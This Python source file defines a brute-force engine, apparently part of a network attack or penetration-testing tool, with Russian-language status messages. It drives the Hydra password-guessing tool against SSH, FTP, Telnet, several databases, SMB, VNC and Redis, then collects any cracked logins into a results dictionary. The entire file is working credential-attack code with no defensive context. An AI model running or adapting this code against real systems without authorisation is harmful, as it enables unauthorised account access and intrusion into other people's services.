import subprocess

class BruteForceEngine:
    SERVICE_MAP = {
        "ssh": "ssh",
        "ftp": "ftp",
        "telnet": "telnet",
        "mysql": "mysql",
        "postgresql": "postgres",
        "ms-sql-s": "mssql",
        "smb": "smb",
        "vnc": "vnc",
        "redis": "redis"
    }

    def __init__(self, users_list, pass_list):
        self.users = users_list
        self.passwords = pass_list

    def run_hydra(self, ip, port, service_name, results_dict):
        hydra_module = self.SERVICE_MAP.get(service_name.lower())
        if not hydra_module:
            return

        print(f"    [Hydra] Брутфорс {hydra_module.upper()} на {ip}:{port}...")
        cmd = ["hydra", "-L", self.users, "-P", self.passwords, "-s", str(port), "-t", "4", ip, hydra_module]
        
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=1200)
            valid_creds = []
            for line in res.stdout.split("\n"):
                if "login:" in line and "password:" in line:
                    clean_line = line.split("login:")[-1].strip()
                    valid_creds.append(f"CREDS: {clean_line}")
            
            if valid_creds:
                print(f"      [!] НАЙДЕНО: {ip}:{port}")
                for cred in valid_creds:
                    print(f"        - {cred}")
                    port_key = f"{port}/tcp"
                    if port_key in results_dict[ip]["ports"]:
                        results_dict[ip]["ports"][port_key]["vulns"].append(f"[HYDRA] {cred}")
            else:
                print(f"      [-] Пароли не подобраны.")
        except Exception as e:
            print(f"      [ERR] Ошибка Hydra: {e}")
